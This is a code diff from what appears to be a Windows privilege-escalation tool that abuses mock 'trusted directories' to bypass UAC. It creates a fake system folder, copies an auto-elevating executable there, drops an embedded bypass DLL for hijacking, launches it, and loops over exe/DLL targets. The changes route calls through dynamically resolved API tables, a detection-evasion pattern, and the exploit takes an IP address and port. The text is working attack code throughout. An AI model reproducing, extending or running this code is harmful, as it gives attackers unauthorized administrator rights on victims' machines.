@@ -84,7 +84,7 @@ BOOL CopyExeFile(char* system32Path, char* fakeSystemDir, char* fileName) {
     return TRUE;
 }
 
-BOOL DropDllFile(char* fakeSystemDir, char* fileName) {
+BOOL DropDllFile(Kernel32_API kernel32, Cabinet_API cabinetAPI, char* fakeSystemDir, char* fileName) {
     BOOL result;
 #if _WIN64
     StrucFile dllToDrop = { L"",UAC_BYPASS_DLL_64,FILE_SIZE_UAC_BYPASS_DLL_64,TRUE,TRUE };
@@ -100,7 +100,7 @@ BOOL DropDllFile(char* fakeSystemDir, char* fileName) {
     swprintf_s(wFilename, MAX_PATH + 1, L"%hs", fileName);
     dllToDrop.filename = wFilename;
 
-    result = DropFile(fakeSystemDir, dllToDrop);
+    result = DropFile(kernel32, cabinetAPI,fakeSystemDir, dllToDrop);
 
     free(wFilename);
     return result;
@@ -108,7 +108,7 @@ BOOL DropDllFile(char* fakeSystemDir, char* fileName) {
 
 
 
-BOOL Trigger(char* fakeSystemDir, char* fileName) {
+BOOL Trigger(Shell32_API shell32, char* fakeSystemDir, char* fileName) {
     SHELLEXECUTEINFOA sinfo = { 0 };
 
     char* fullPath = (char*)malloc(MAX_PATH);
@@ -135,7 +135,7 @@ BOOL Trigger(char* fakeSystemDir, char* fileName) {
         SEM_NOGPFAULTERRORBOX |
         SEM_NOOPENFILEERRORBOX);
 
-    if (!ShellExecuteExA(&sinfo) || sinfo.hProcess == NULL) {
+    if (!shell32.ShellExecuteExAF(&sinfo) || sinfo.hProcess == NULL) {
         printMsg(STATUS_ERROR2, LEVEL_VERBOSE, "Failed to create process");
         return FALSE;
     }
@@ -205,11 +205,11 @@ BOOL FullCleanUp(char* fakeSystemDir) {
     RemoveFakeDirectory(fakeSystemDir);
     return TRUE;
 }
-BOOL ExploitDT(Advapi32_API advapi32, char* exeName, char* dllName, char* system32Path, char* fakeSystemDir) {
+BOOL ExploitDT(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* exeName, char* dllName, char* system32Path, char* fakeSystemDir) {
     if (CreateFakeDirectory(fakeSystemDir)) {
         if (CopyExeFile(system32Path, fakeSystemDir, exeName)) {
-            if (DropDllFile(fakeSystemDir, dllName)) {
-                Trigger(fakeSystemDir,exeName);
+            if (DropDllFile(kernel32, cabinetAPI,fakeSystemDir, dllName)) {
+                Trigger(shell32,fakeSystemDir,exeName);
 
                 Sleep(100);
                 CleanUpFakeDirectory(fakeSystemDir, exeName, dllName);
@@ -249,7 +249,7 @@ BOOL GetFakeSystemPath(Kernel32_API kernel32, char** system32Path, char** fakeSy
 
 
 
-BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, char* PathExeToRun, WCHAR* UipAddress, char* port) {
+BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* PathExeToRun, WCHAR* UipAddress, char* port) {
     BOOL exploitSuccessed = FALSE;
     char* system32Path = NULL;
     char* fakeSystemDir = NULL;
@@ -276,7 +276,7 @@ BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, cha
     for (int i = 0; i < sizeof(dllList) / sizeof(DllList) && !exploitSuccessed; i++) {
         for (int j = 0; j < dllList[i].tableSize && !exploitSuccessed; j++) {
             printMsg(STATUS_OK2, LEVEL_DEFAULT, "Target: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
-            if (ExploitDT(advapi32,(char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path, fakeSystemDir)) {
+            if (ExploitDT(kernel32,advapi32, shell32, cabinetAPI,(char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path, fakeSystemDir)) {
                 printMsg(STATUS_OK2, LEVEL_DEFAULT, "Vulnerable: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
                 exploitSuccessed = TRUE;
             }
